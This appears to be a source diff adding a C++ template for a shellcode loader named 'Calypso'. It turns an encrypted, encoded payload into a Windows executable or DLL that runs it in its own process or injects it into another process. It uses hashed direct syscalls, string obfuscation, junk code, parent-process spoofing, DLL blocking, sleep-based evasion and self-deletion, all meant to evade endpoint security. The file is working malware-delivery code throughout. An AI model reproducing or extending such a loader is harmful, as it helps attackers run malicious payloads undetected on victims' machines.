@@ -1,0 +1,358 @@
+// Calypso loader - Shellcode injection
+// Based on NimSyscallPacker by @ShitSecure
+#include <windows.h>
+#include <winternl.h>
+#include <tlhelp32.h>
+
+#include "obfuscate.hpp.in"
+#include "syscalls.hpp.in"
+#include "crypto_stub.hpp.in"
+#include "common.hpp.in"
+#include "evasion.hpp.in"
+
+{{JUNK_CODE_BLOCKS}}
+
+// Encrypted payload
+{{ENCRYPTED_PAYLOAD}}
+
+// Encryption key
+{{KEY_DATA}}
+
+// Configuration
+static constexpr size_t ORIGINAL_SIZE = {{ORIGINAL_SIZE}};
+
+{{#IF ENCODE_NONE}}
+// No encoding - payload is raw bytes
+{{#ENDIF}}
+
+{{#IF ENCODE_BASE64}}
+static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
+{{#ENDIF}}
+{{#IF ENCODE_HEX}}
+static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
+{{#ENDIF}}
+{{#IF ENCODE_MAC}}
+static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
+{{#ENDIF}}
+{{#IF ENCODE_UUID}}
+static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
+{{#ENDIF}}
+
+{{#IF LOCAL_INJECT}}
+static void execute_local() {
+    // Decode if needed
+    uint8_t* encrypted = nullptr;
+    size_t encrypted_len = 0;
+
+{{#IF ENCODE_NONE}}
+    encrypted = payload;
+    encrypted_len = payload_len;
+{{#ENDIF}}
+{{#IF ENCODE_BASE64}}
+    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
+    encrypted_len = decode_base64(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    encrypted = decode_buf;
+{{#ENDIF}}
+{{#IF ENCODE_HEX}}
+    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
+    encrypted_len = decode_hex(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    encrypted = decode_buf;
+{{#ENDIF}}
+{{#IF ENCODE_MAC}}
+    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
+    encrypted_len = decode_mac(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    encrypted = decode_buf;
+{{#ENDIF}}
+{{#IF ENCODE_UUID}}
+    uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
+    encrypted_len = decode_uuid(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    encrypted = decode_buf;
+{{#ENDIF}}
+
+    // Decrypt
+    uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
+    size_t decrypted_len = sizeof(decrypted);
+    if (!decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len)) {
+{{#IF VERBOSE}}
+        // Decryption failed
+{{#ENDIF}}
+        return;
+    }
+
+    // Decompress
+    uint8_t* shellcode = decrypted;
+    size_t shellcode_len = decrypted_len;
+
+{{#IF COMPRESS_ZLIB}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_zlib(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_lz4(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
+
+{{#IF SLEEP_IN_BETWEEN}}
+    evasion_sleep({{SLEEP_IN_BETWEEN_SECONDS}});
+{{#ENDIF}}
+
+    // Allocate memory via syscall
+    PVOID base_addr = nullptr;
+    SIZE_T region_size = shellcode_len;
+    HANDLE hProc = GetCurrentProcess();
+
+    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
+    if (!NtAVM) return;
+
+    NTSTATUS status = NtAVM(hProc, &base_addr, 0, &region_size,
+                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) return;
+
+    // Copy shellcode
+    PVOID exec_addr = base_addr;
+    memcpy(base_addr, shellcode, shellcode_len);
+
+    // Change to RX (NtProtectVirtualMemory may mutate base_addr/region_size)
+    ULONG old_prot;
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (!NtPVM) return;
+    NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
+
+{{#IF EXEC_DIRECT}}
+    // Direct execution
+    auto fn = reinterpret_cast<void(*)()>(exec_addr);
+    fn();
+{{#ENDIF}}
+
+{{#IF EXEC_THREAD}}
+    // NtCreateThreadEx
+    HANDLE hThread = nullptr;
+    auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+    if (!NtCTE) return;
+    NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, exec_addr,
+          NULL, 0, 0, 0, 0, NULL);
+    if (hThread) {
+        auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
+        if (NtWFSO) NtWFSO(hThread, FALSE, NULL);
+    }
+{{#ENDIF}}
+
+{{#IF EXEC_APC}}
+    // NtQueueApcThread - queue to current thread, then alertable wait
+    auto NtQAT = get_syscall_fn<NtQueueApcThread_t>(HASH_NtQueueApcThread);
+    if (!NtQAT) return;
+    NtQAT(GetCurrentThread(), exec_addr, NULL, NULL, NULL);
+    // Trigger APC delivery
+    SleepEx(INFINITE, TRUE);
+{{#ENDIF}}
+
+{{#IF EXEC_CALLBACK}}
+    // Callback execution via EnumWindows
+    EnumWindows(reinterpret_cast<WNDENUMPROC>(exec_addr), 0);
+{{#ENDIF}}
+
+    // Zero shellcode from stack
+    SecureZeroMemory(decrypted, sizeof(decrypted));
+{{#IF COMPRESS_ZLIB}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+}
+{{#ENDIF}}
+
+{{#IF REMOTE_INJECT}}
+static void execute_remote() {
+    // Find/create target process
+    DWORD target_pid = 0;
+
+    // Snapshot processes to find target
+    using CreateToolhelp32Snapshot_t = HANDLE(WINAPI*)(DWORD, DWORD);
+    using Process32FirstW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
+    using Process32NextW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
+
+    HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
+    auto pSnap = reinterpret_cast<CreateToolhelp32Snapshot_t>(
+        GetProcAddress(hK32, obf("CreateToolhelp32Snapshot")));
+    auto pFirst = reinterpret_cast<Process32FirstW_t>(
+        GetProcAddress(hK32, obf("Process32FirstW")));
+    auto pNext = reinterpret_cast<Process32NextW_t>(
+        GetProcAddress(hK32, obf("Process32NextW")));
+
+    if (!pSnap || !pFirst || !pNext) return;
+
+    HANDLE hSnap = pSnap(0x2 /* TH32CS_SNAPPROCESS */, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe = {};
+    pe.dwSize = sizeof(pe);
+    if (pFirst(hSnap, &pe)) {
+        do {
+            // Compare with target process name
+            const wchar_t* target = obf_wide(L"{{TARGET_PROCESS}}");
+            if (lstrcmpiW(pe.szExeFile, target) == 0) {
+                target_pid = pe.th32ProcessID;
+                break;
+            }
+        } while (pNext(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+
+    if (target_pid == 0) return;
+
+{{#IF PPID_SPOOF}}
+    // PPID spoofing - create suspended process with spoofed parent
+    STARTUPINFOEXW si = {};
+    PROCESS_INFORMATION pi = {};
+    si.StartupInfo.cb = sizeof(si);
+
+    SIZE_T attr_size = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
+    si.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
+        HeapAlloc(GetProcessHeap(), 0, attr_size));
+    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size);
+
+    // Find parent PID
+    DWORD parent_pid = 0;
+    // ... (similar snapshot for parent process)
+    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
+    UpdateProcThreadAttribute(si.lpAttributeList, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL);
+
+{{#IF BLOCK_DLLS}}
+    DWORD64 policy = 0x100000000000; // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+    UpdateProcThreadAttribute(si.lpAttributeList, 0,
+        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+{{#ENDIF}}
+
+    CreateProcessW(NULL, const_cast<LPWSTR>(obf_wide(L"{{TARGET_PROCESS}}")),
+                   NULL, NULL, FALSE,
+                   EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+                   NULL, NULL, &si.StartupInfo, &pi);
+    target_pid = pi.dwProcessId;
+    // Use pi.hProcess for injection target
+{{#ENDIF}}
+
+    // Open target process via syscall
+    HANDLE hTarget = nullptr;
+    OBJECT_ATTRIBUTES oa = {};
+    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+    CLIENT_ID cid = {};
+    cid.UniqueProcess = UlongToHandle(target_pid);
+
+    using NtOpenProcess_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
+        POBJECT_ATTRIBUTES, PCLIENT_ID);
+    auto NtOP = get_syscall_fn<NtOpenProcess_t>(HASH_NtOpenProcess);
+    if (!NtOP) return;
+    NtOP(&hTarget, PROCESS_ALL_ACCESS, &oa, &cid);
+    if (!hTarget) return;
+
+    // Decode + decrypt payload (same as local)
+    uint8_t* encrypted = nullptr;
+    size_t encrypted_len = 0;
+{{#IF ENCODE_NONE}}
+    encrypted = payload;
+    encrypted_len = payload_len;
+{{#ENDIF}}
+    // (other encoding paths same as local)
+
+    uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
+    size_t decrypted_len = sizeof(decrypted);
+    decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len);
+
+    uint8_t* shellcode = decrypted;
+    size_t shellcode_len = decrypted_len;
+    // (decompression same as local)
+
+    // Remote allocation
+    PVOID remote_addr = nullptr;
+    SIZE_T remote_size = shellcode_len;
+
+    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
+    NtAVM(hTarget, &remote_addr, 0, &remote_size,
+          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // Write shellcode
+    auto NtWVM = get_syscall_fn<NtWriteVirtualMemory_t>(HASH_NtWriteVirtualMemory);
+    SIZE_T written = 0;
+    NtWVM(hTarget, remote_addr, shellcode, shellcode_len, &written);
+
+    // Change protection
+    ULONG old_prot;
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    NtPVM(hTarget, &remote_addr, &remote_size, PAGE_EXECUTE_READ, &old_prot);
+
+    // Create remote thread
+    HANDLE hThread = nullptr;
+    auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+    NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hTarget, remote_addr,
+          NULL, 0, 0, 0, 0, NULL);
+
+    if (hThread) {
+        auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
+        NtWFSO(hThread, FALSE, NULL);
+        auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
+        NtCl(hThread);
+    }
+    auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
+    NtCl(hTarget);
+
+    SecureZeroMemory(decrypted, sizeof(decrypted));
+}
+{{#ENDIF}}
+
+{{#IF DLL_ENTRY}}
+static bool g_initialized = false;
+
+static void run_payload() {
+    if (!g_initialized) {
+        if (!init_syscalls()) return;
+        if (!evasion_init()) return;
+        g_initialized = true;
+    }
+{{#IF LOCAL_INJECT}}
+    execute_local();
+{{#ENDIF}}
+{{#IF REMOTE_INJECT}}
+    execute_remote();
+{{#ENDIF}}
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hinstDLL);
+    }
+    return TRUE;
+}
+
+{{DLL_EXPORTS}}
+{{#ENDIF}}
+
+{{#IF EXE_ENTRY}}
+int main() {
+    if (!init_syscalls()) return 1;
+    if (!evasion_init()) return 1;
+
+{{#IF LOCAL_INJECT}}
+    execute_local();
+{{#ENDIF}}
+{{#IF REMOTE_INJECT}}
+    execute_remote();
+{{#ENDIF}}
+
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
+    return 0;
+}
+{{#ENDIF}}
